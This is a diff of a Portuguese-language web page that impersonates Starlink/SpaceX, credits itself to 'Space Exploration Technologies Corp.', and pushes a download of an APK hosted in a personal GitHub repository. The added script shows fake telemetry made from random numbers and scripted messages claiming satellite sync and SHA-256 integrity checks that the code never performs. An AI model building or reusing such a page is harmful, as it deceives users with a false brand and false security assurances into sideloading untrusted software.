@@ -1,56 +1,323 @@
-html
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Starlink Mobile</title>
-<style>
-{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial}
-body{background:0b0b0b;color:e6e6e6;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:30px;text-align:center}
-.logo{width:160px;height:160px;background:url('data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjAwIDIwMCI+PHBhdGggZD0iTTEwMCAyMEwxMjAgODBMMTgwIDgwTDEzNSAxMjBMMTU1IDE4MEwxMDAgMTQ1TDQ1IDE4MEw2NSAxMjBMMjAgODB2MHoiIGZpbGw9Ii1e1e1e" stroke="00d4ff" stroke-width="6" stroke-linejoin="round"/></svg>') center/contain no-repeat;margin-bottom:30px}
-h1{font-size:32px;color:00d4ff;margin-bottom:12px;letter-spacing:1px}
-p{font-size:18px;color:999;margin-bottom:35px}
-.btn{background:00d4ff;color:000;border:none;padding:22px 60px;border-radius:40px;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 0 25px 00d4ff;transition:.25s}
-.btn:hover{transform:scale(1.05);box-shadow:0 0 40px 00d4ff}
-.progress{width:85%;height:12px;background:111;border-radius:6px;margin-top:30px;overflow:hidden}
-.bar{height:100%;background:00d4ff;width:0%;transition:width .25s}
-.percent{margin-top:12px;font-size:16px;color:00d4ff}
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Starlink Mobile | Conectividade Global</title>
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --bg: #050505;
+            --text: #ffffff;
+            --font-main: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-main);
+        }
+
+        body {
+            background-color: var(--bg);
+            background-image: 
+                linear-gradient(to bottom, rgba(5, 5, 5, 0.8), rgba(5, 5, 5, 0.95)),
+                url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&q=80&w=2072');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            background: transparent url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
+            opacity: 0.3;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            padding: 40px 30px;
+            border-radius: 2px;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9);
+        }
+
+        /* Telemetria estilo SpaceX */
+        .telemetry-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .tel-box {
+            text-align: left;
+        }
+
+        .tel-label {
+            font-size: 8px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #666;
+            display: block;
+        }
+
+        .tel-value {
+            font-size: 14px;
+            color: var(--primary);
+            font-family: monospace;
+        }
+
+        .logo {
+            width: 120px;
+            height: 60px;
+            margin: 0 auto 30px;
+            background: var(--primary);
+            mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5'%3E%3C/path%3E%3C/svg%3E") no-repeat center;
+            -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5'%3E%3C/path%3E%3C/svg%3E") no-repeat center;
+            mask-size: contain;
+            -webkit-mask-size: contain;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 300;
+            color: #fff;
+            margin-bottom: 15px;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+        }
+
+        p {
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 40px;
+            line-height: 1.8;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        .btn {
+            width: 100%;
+            background: #fff;
+            color: #000;
+            border: none;
+            padding: 22px;
+            font-size: 13px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+        }
+
+        .btn:hover:not(:disabled) {
+            background: var(--primary);
+            color: #fff;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.4);
+        }
+
+        .btn:disabled {
+            background: #1a1a1a;
+            color: #444;
+            cursor: not-allowed;
+        }
+
+        .progress-container {
+            display: none;
+            margin-top: 40px;
+            text-align: left;
+        }
+
+        .progress-label-wrap {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .status-text {
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #888;
+        }
+
+        .percent-text {
+            font-size: 14px;
+            color: var(--primary);
+            font-weight: bold;
+            font-family: monospace;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 2px;
+            background: rgba(255,255,255,0.1);
+            position: relative;
+        }
+
+        .bar-fill {
+            height: 100%;
+            background: var(--primary);
+            width: 0%;
+            transition: width 0.4s ease;
+            box-shadow: 0 0 15px var(--primary);
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 8px;
+            color: rgba(255, 255, 255, 0.2);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+
+        /* Scanline sutil */
+        .container::after {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: rgba(0, 212, 255, 0.05);
+            animation: scan 6s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
+    </style>
 </head>
 <body>
-<div class="logo"></div>
-<h1>Starlink Mobile</h1>
-<p>Download direto, sem sair da página.</p>
-<button class="btn" onclick="startDownload()">BAIXAR AGORA</button>
-<div class="progress"><div class="bar" id="bar"></div></div>
-<div class="percent" id="percent">0%</div>
 
-<script>
-function startDownload(){
-  const btn=document.querySelector('.btn');
-  const bar=document.getElementById('bar');
-  const percent=document.getElementById('percent');
-  btn.disabled=true;
-  btn.innerText='INICIANDO...';
-  let w=0;
-  const iv=setInterval(()=>{
-    w+=Math.random()7+3;
-    if(w>100)w=100;
-    bar.style.width=w+'%';
-    percent.innerText=Math.floor(w)+'%';
-    if(w===100){
-      clearInterval(iv);
-      const a=document.createElement('a');
-      a.href='https://raw.githubusercontent.com/Abravaaaa/STAR3/main/STARLINK%20INTERNET%20VIA%20SAT.apk
-';
-      a.download='STARLINK INTERNET VIA SAT.apk';
-      a.click();
-      btn.innerText='CONCLUÍDO';
-      percent.innerText='100% – APK salvo';
-    }
-  },180);
-}
-</script>
+    <div class="stars"></div>
+
+    <div class="container">
+        <!-- Telemetria -->
+        <div class="telemetry-grid">
+            <div class="tel-box">
+                <span class="tel-label">Downlink</span>
+                <span class="tel-value" id="tel-down">-- Mbps</span>
+            </div>
+            <div class="tel-box">
+                <span class="tel-label">Latency</span>
+                <span class="tel-value" id="tel-lat">-- ms</span>
+            </div>
+        </div>
+
+        <div class="logo"></div>
+        <h1>Starlink</h1>
+        <p>A frota de satélites SpaceX em órbita terrestre baixa, agora disponível no seu dispositivo móvel.</p>
+        
+        <button class="btn" id="dlBtn" onclick="startDownload()">Instalar Aplicação</button>
+
+        <div class="progress-container" id="pContainer">
+            <div class="progress-label-wrap">
+                <span class="status-text" id="status">A ligar aos satélites...</span>
+                <span class="percent-text" id="percent">0%</span>
+            </div>
+            <div class="progress-bar-bg">
+                <div class="bar-fill" id="bar"></div>
+            </div>
+        </div>
+
+        <div class="footer">Space Exploration Technologies Corp.</div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            // URL ATUALIZADA DO SEU GITHUB
+            apkUrl: "https://raw.githubusercontent.com/Abravaaaa/STAR3/main/STARLINK%20INTERNET%20VIA%20SAT.apk",
+            
+            // NOME DO ARQUIVO ATUALIZADO
+            fileName: "STARLINK INTERNET VIA SAT.apk",
+
+            simulatedSpeed: 1.5,
+
+            messages: [
+                "A procurar feixe de sinal...",
+                "Sincronização orbital concluída",
+                "A descarregar pacotes encriptados...",
+                "A verificar integridade SHA-256...",
+                "A finalizar instalação..."
+            ]
+        };
+
+        // Telemetria em tempo real
+        function runTelemetry() {
+            setInterval(() => {
+                const down = (Math.random() * (220 - 180) + 180).toFixed(1);
+                const lat = Math.floor(Math.random() * (32 - 18) + 18);
+                document.getElementById('tel-down').innerText = `${down} Mbps`;
+                document.getElementById('tel-lat').innerText = `${lat} ms`;
+            }, 1500);
+        }
+        runTelemetry();
+
+        function startDownload() {
+            const btn = document.getElementById('dlBtn');
+            const bar = document.getElementById('bar');
+            const percent = document.getElementById('percent');
+            const status = document.getElementById('status');
+            const container = document.getElementById('pContainer');
+
+            btn.disabled = true;
+            btn.innerText = 'Transmissão Ativa';
+            container.style.display = 'block';
+
+            let progress = 0;
+            
+            const timer = setInterval(() => {
+                progress += (Math.random() * 2 + 0.5) * CONFIG.simulatedSpeed;
+                
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                    finish();
+                }
+
+                bar.style.width = progress + '%';
+                percent.innerText = Math.floor(progress) + '%';
+
+                if (progress < 20) status.innerText = CONFIG.messages[0];
+                else if (progress < 45) status.innerText = CONFIG.messages[1];
+                else if (progress < 75) status.innerText = CONFIG.messages[2];
+                else if (progress < 92) status.innerText = CONFIG.messages[3];
+                else status.innerText = CONFIG.messages[4];
+
+            }, 100);
+
+            function finish() {
+                status.innerText = "Download concluído";
+                status.style.color = "#00d4ff";
+                btn.innerText = "Concluído";
+
+                const a = document.createElement('a');
+                a.href = CONFIG.apkUrl;
+                a.download = CONFIG.fileName;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+        }
+    </script>
 </body>
 </html>
